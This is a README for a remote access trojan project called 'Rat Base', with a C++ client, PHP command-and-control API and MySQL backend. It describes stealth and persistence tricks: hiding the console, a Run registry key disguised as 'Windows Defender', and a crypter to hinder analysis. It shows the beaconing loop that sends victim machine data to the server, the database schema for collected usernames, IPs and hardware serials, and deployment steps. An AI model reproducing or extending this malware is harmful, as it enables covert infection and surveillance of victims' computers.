# Rat Base
A basic base for a Remote. Access. Tool. written in native C++, PHP, and MySQL.

# Usage
This RAT is not like most others it sends a GET request with all its data split by `|` to a API.
This RAT is primarily made for recon as it doesn't provide any post-exploitation modules but that might be added in the feature as well as a frontend.
You should launch this server on a nginx or apache2 server with PHP installed.
Then compile the client with updated CNC IPv4, and Port.

# How does it work?
In the first line of the client it free's console so it's hidden (obviously)
then it creates registry values in `SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run` called `Windows Defender 1.4.3` to infect it to startup.
using RCrypter to make it very hard to debug and analyze on runtime-
It then creates a loop that is going to run forever (well not forever since it's uncertain but you know what I mean) where it then gets PC info and pushes it to db
```cpp
PCInfo* LocalPC;

while (true) {
	LocalPC = new PCInfo(); // Makes new instance of the computers info
	
	LocalPC->PushData(); // Pushes PC data to web-server

	Sleep(1000); // Waits 1 second
}
```

# Database Structure
The `rats` table has a few values for frontend like serialnumbers, `last_active`, ip, and pc username.
This is the `rats` SQL structure
```sql
CREATE TABLE `rat` (
  `id` int(11) NOT NULL,
  `pcname` varchar(50) NOT NULL,
  `username` varchar(50) NOT NULL,
  `ip` varchar(20) NOT NULL,
  `disk_serial` varchar(255) NOT NULL,
  `baseboard_serial` varchar(255) NOT NULL,
  `ram_serial` varchar(255) NOT NULL,
  `cpu` varchar(255) NOT NULL,
  `last_active` datetime DEFAULT current_timestamp(),
  `created_at` datetime DEFAULT current_timestamp()
);
```

# API
The API is quite simple it checks if the IP is already in any of the rows and if it is, API updates the row, if its not API inserts data into DB.


# Why?
This project was for me to see if i could make one with clean and code.

# Credits
In the API I used a function called get_ip() which was taken from @timothyikennedy

In client I used a function called DoGET() which was taken from a stackoverflow post (I don't remember or have link)

@Akex64: Creating the whole client except some functions and API

@skadro-official: skCrypter / RCrypter.h
 



